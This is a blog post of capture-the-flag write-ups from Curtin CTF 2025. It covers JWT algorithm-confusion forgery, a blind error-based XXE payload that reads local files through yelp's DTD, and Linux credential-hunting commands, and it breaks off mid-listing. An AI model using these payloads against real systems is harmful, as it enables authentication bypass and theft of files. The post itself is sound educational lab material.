@@ -1,0 +1,249 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Just a fun little CTF"><title>Curtin CTF 2025 Selected Writeups</title><link rel=canonical href=https://trinuro.github.io/p/curtin-ctf-2025-selected-writeups/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="Curtin CTF 2025 Selected Writeups"><meta property='og:description' content="Just a fun little CTF"><meta property='og:url' content='https://trinuro.github.io/p/curtin-ctf-2025-selected-writeups/'><meta property='og:site_name' content="Froginacup's site"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Ctf'><meta property='article:published_time' content='2025-12-21T09:34:22-05:00'><meta property='article:modified_time' content='2025-12-21T09:34:22-05:00'><meta name=twitter:title content="Curtin CTF 2025 Selected Writeups"><meta name=twitter:description content="Just a fun little CTF"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_aff73beef7294c1a.jpg width=300 height=299 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>💡</span></figure><div class=site-meta><h1 class=site-name><a href=/>Froginacup's site</a></h1><h2 class=site-description>A place where Froginacup writes his adventures</h2></div></header><ol class=menu-social><li><a href=https://github.com/trinuro target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/projects-and-certificates/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Projects and Certificates</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#agent-jonathan-walkins-trafalgar---jwt-confusion>Agent Jonathan Walkins Trafalgar - JWT Confusion</a></li><li><a href=#brailley---blind-xxe>Brailley - Blind XXE</a></li><li><a href=#misc-7---sticky-bit>Misc 7 - Sticky Bit</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctf-writeups/ style=background-color:#2a9d8f;color:#fff>CTF Writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/curtin-ctf-2025-selected-writeups/>Curtin CTF 2025 Selected Writeups</a></h2><h3 class=article-subtitle>Just a fun little CTF</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-12-21T09:34:22-05:00>Dec 21, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><p>Here are some cool questions from Curtin CTF 2025. Funny how there is no official writeups. Still waiting for NextJS Challenge Writeup lol</p><h2 id=agent-jonathan-walkins-trafalgar---jwt-confusion>Agent Jonathan Walkins Trafalgar - JWT Confusion</h2><ol><li>None algo does not work</li><li>Removing auth part of the JWT does not work</li><li>This is the public key</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzzh4QcrzhduRn3K1af38WTQMw1QRDjLTjeQKBiQPxyME2piCb+XKUq5WFJOS0VfpDEaSLTJ1W/S662ANgIAy6qw6Y3iovB7C8WwIC1dZ2/5VdKTX8yjoVYaofjzZGKnoHMxoBkELmH7z7GFoNZB4AJ8XSJx1Ibl4f+Y1TtGN+8xhg+2F8KbbuJhHxYiPPoMGxLNyPvay+t0A8Fxf/Qk8LGwxjIN6qnMDCnpZ6MhOj60Poh493EhZ03/1YhGGXE2S0SYm3jOetnueAc4cXxPTOCe4yS8u+pDg89swqlR/sEtO1H99pojRGv1LceD2m93isiLqLqvkJAuvmOJ6z9a9uQIDAQAB
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>I think it is vulnerable to <a class=link href=https://portswigger.net/web-security/jwt/algorithm-confusion target=_blank rel=noopener>Algorithm Confusion</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/flag?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTc2NTA3OTIzMX0.P_CyhS2vWCrsGLxc_tqGrDpaOLJbJ1Jfmz6sR41NLSA</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Invalid signature
+</span></span></code></pre></td></tr></table></div></div><ul><li>Instead of <code>Unsupported algorithm</code></li></ul><ol start=5><li>First, send the public key to Decoder. The trailing new line is VERY IMPORTANT.
+<img src=/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-1.png width=2379 height=547 srcset="/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-1_hu_5d0e45aefb7162a7.png 480w, /p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-1_hu_d4f104f121063c4c.png 1024w" loading=lazy alt=Curtin-CTF-2025-1.png class=gallery-image data-flex-grow=434 data-flex-basis=1043px></li><li>Go the JWT Editor tab > New Symmetric Key > Generate. Replace the value of <code>k</code> with the base64 encoded public key
+<img src=/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-2.png width=2379 height=1086 srcset="/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-2_hu_820ad92c312ff9a2.png 480w, /p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-2_hu_97fc3f1170f7c303.png 1024w" loading=lazy alt=Curtin-CTF-2025-2.png class=gallery-image data-flex-grow=219 data-flex-basis=525px></li><li>Go to <code>jwt.io</code> and Generate an example JWT.
+<img src=/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-3.png width=2828 height=1360 srcset="/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-3_hu_e33de219cc208146.png 480w, /p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-3_hu_7a29d1c51244fbea.png 1024w" loading=lazy alt=Curtin-CTF-2025-3.png class=gallery-image data-flex-grow=207 data-flex-basis=499px></li><li>Paste the JWT into the webapp and send it to the server.</li><li>Send the request to repeater and click on JSON Web Token tab. Select the HS256 Signing key we generated earlier.
+<img src=/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-4.png width=2378 height=1317 srcset="/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-4_hu_5ac5ba6cf1dfb43f.png 480w, /p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-4_hu_282a653060995bc3.png 1024w" loading=lazy alt=Curtin-CTF-2025-4.png class=gallery-image data-flex-grow=180 data-flex-basis=433px></li><li>Send the request and we get the flag</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/flag?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTc2NTA3OTIzMX0.z0s9XqALGaYm5AnA-OUS8Kf5bdOW-9HFxDrfJpOFBbk</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Welcome Admin! Here is your flag: CURTIN_CTF{alg_c0nfus10n_w1th_publ1c_k3y_1s_c00l}
+</span></span></code></pre></td></tr></table></div></div><h2 id=brailley---blind-xxe>Brailley - Blind XXE</h2><ol><li>This app will send Braille in Number form to the backend.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/search</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>{&#34;message&#34;</span><span class=o>:</span><span class=l>&#34;1234010123502402340&#34;}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#34;ValueSearch&#34;: &#34;Welcome! Our center is located in 8 rue de Londres, 75008 Paris, Opening hours for this center is 10:00-19:00&#34;}
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>I realise that the number corresponds with the Brialle-Number of each character. Space is 0.
+<img src=/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-5.png width=1440 height=606 srcset="/p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-5_hu_ced697af53081cc4.png 480w, /p/curtin-ctf-2025-selected-writeups/Curtin-CTF-2025-5_hu_839ed3db26564cd0.png 1024w" loading=lazy alt=Curtin-CTF-2025-5.png class=gallery-image data-flex-grow=237 data-flex-basis=570px></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PARIS =&gt; 1234010123502402340
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Let&rsquo;s try to get FLAG</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/search</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>{&#34;message&#34;</span><span class=o>:</span><span class=l>&#34;124012301012450&#34;}</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>Does not work</li></ul><ol start=4><li>Let&rsquo;s try to read the Braille on the website</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>6012012350102401230123015013456036060234501250150601201230240134501450102340234013501402401023450240135013450
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>I decided to download the source code to review it. This is the logic of <code>/api/search</code> endpoint.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/api/search&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>api</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=n>posted_type</span> <span class=o>==</span> <span class=s1>&#39;application/json&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=c1># Verify if it is JSON.</span>
+</span></span><span class=line><span class=cl>    <span class=c1># do something</span>
+</span></span><span class=line><span class=cl>  <span class=c1># Verify if it is XML.</span>
+</span></span><span class=line><span class=cl>  <span class=k>elif</span> <span class=n>posted_type</span> <span class=o>==</span> <span class=s1>&#39;application/xml&#39;</span> <span class=ow>or</span> <span class=n>posted_type</span> <span class=o>==</span> <span class=s1>&#39;text/xml&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Configure the parser to be vulnerable.</span>
+</span></span><span class=line><span class=cl>        <span class=n>whatformat</span> <span class=o>=</span> <span class=s2>&#34;xml&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>parser</span> <span class=o>=</span> <span class=n>ET</span><span class=o>.</span><span class=n>XMLParser</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>dtd_validation</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>load_dtd</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>no_network</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>huge_tree</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>tree</span> <span class=o>=</span> <span class=n>ET</span><span class=o>.</span><span class=n>parse</span><span class=p>(</span><span class=n>StringIO</span><span class=p>(</span><span class=n>posted_data</span><span class=p>),</span> <span class=n>parser</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>elem</span> <span class=o>=</span> <span class=n>tree</span><span class=o>.</span><span class=n>getroot</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>processed_data</span> <span class=o>=</span> <span class=n>elem</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>ET</span><span class=o>.</span><span class=n>ParseError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Display error message.</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>message</span>
+</span></span><span class=line><span class=cl>   <span class=c1># If not JSON or XML.</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;ValueSearch&#39;</span><span class=p>:</span> <span class=s1>&#39;invalid format&#39;</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>Ok, interesting. This application accepts XML Input too.</li></ul><ol start=6><li>This is an example valid XML input.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/search</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=g>Host: curtinctfmy-brailley.chals.io
+</span></span></span><span class=line><span class=cl><span class=g>
+</span></span></span><span class=line><span class=cl><span class=g>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span></span><span class=line><span class=cl><span class=g>
+</span></span></span><span class=line><span class=cl><span class=g>&lt;!DOCTYPE message [
+</span></span></span><span class=line><span class=cl><span class=g>
+</span></span></span><span class=line><span class=cl><span class=g>  &lt;!ELEMENT message (#PCDATA)&gt;
+</span></span></span><span class=line><span class=cl><span class=g>
+</span></span></span><span class=line><span class=cl><span class=g>]&gt;
+</span></span></span><span class=line><span class=cl><span class=g>
+</span></span></span><span class=line><span class=cl><span class=g>&lt;message&gt;1234010123502402340&lt;/message&gt;
+</span></span></span></code></pre></td></tr></table></div></div><ol start=7><li>There is no direct way for us to exfiltrate file contents so we have to rely on Error-based XXE</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PYTHON data-lang=PYTHON><span class=line><span class=cl>    <span class=k>except</span> <span class=n>ET</span><span class=o>.</span><span class=n>ParseError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Display error message.</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>message</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>Reference: <a class=link href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-error-based-xxe target=_blank rel=noopener>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-error-based-xxe</a> and <a class=link href=https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md target=_blank rel=noopener>https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md</a>
+From the Dockerfile, I noticed some non-traditional installs.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl><span class=k>RUN</span> apt-get install -y -q libreoffice<span class=err>
+</span></span></span><span class=line><span class=cl><span class=k>RUN</span> apt-get install -y -q yelp<span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><ol start=8><li>Sure enough, we can read local files with the help of yelp&rsquo;s DTD</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE message [
+</span></span></span><span class=line><span class=cl><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>     &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=cp>&lt;!ENTITY % ISOamsa &#39;
+</span></span></span><span class=line><span class=cl><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>        &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///flag&#34;&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=cp>&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=ni>&amp;#x25;</span>eval;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=ni>&amp;#x25;</span>error;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        &#39;&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    %local_dtd;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>]&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nt>&lt;message&gt;</span>%local_dtd;<span class=nt>&lt;/message&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Invalid URI: file:///abcxyz/CURTIN_CTF{⠞⠓⠼⠉_⠼⠚⠝⠑_⠺⠓⠕_⠋⠑⠼⠉⠇_⠼⠁⠞_⠁⠇⠇_⠺⠊⠞⠓⠼⠚⠥⠞_⠎⠑⠑⠼⠁⠝⠛_⠊⠞_⠼⠙⠇⠇}, line 4, column 15
+</span></span></code></pre></td></tr></table></div></div><h2 id=misc-7---sticky-bit>Misc 7 - Sticky Bit</h2><ol><li>To find the flag, a simple <code>find</code> will do</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>find / -name *flag* 2&gt;/dev/null
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>flag</span><span class=o>/</span><span class=n>flag</span>
+</span></span><span class=line><span class=cl><span class=o>...</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>The permissions of the file</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>-</span><span class=n>r</span><span class=o>--------</span> <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span> <span class=mi>19</span> <span class=n>Nov</span> <span class=mi>30</span> <span class=mi>09</span><span class=p>:</span><span class=mi>15</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>flag</span><span class=o>/</span><span class=n>flag</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Let&rsquo;s perform cred hunting</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>grep -rn &#34;passw\|pwd&#34; /etc/* 2&gt;/dev/null
+</span></span></code></pre></td></tr></table></div></div><ul><li>Nothing</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
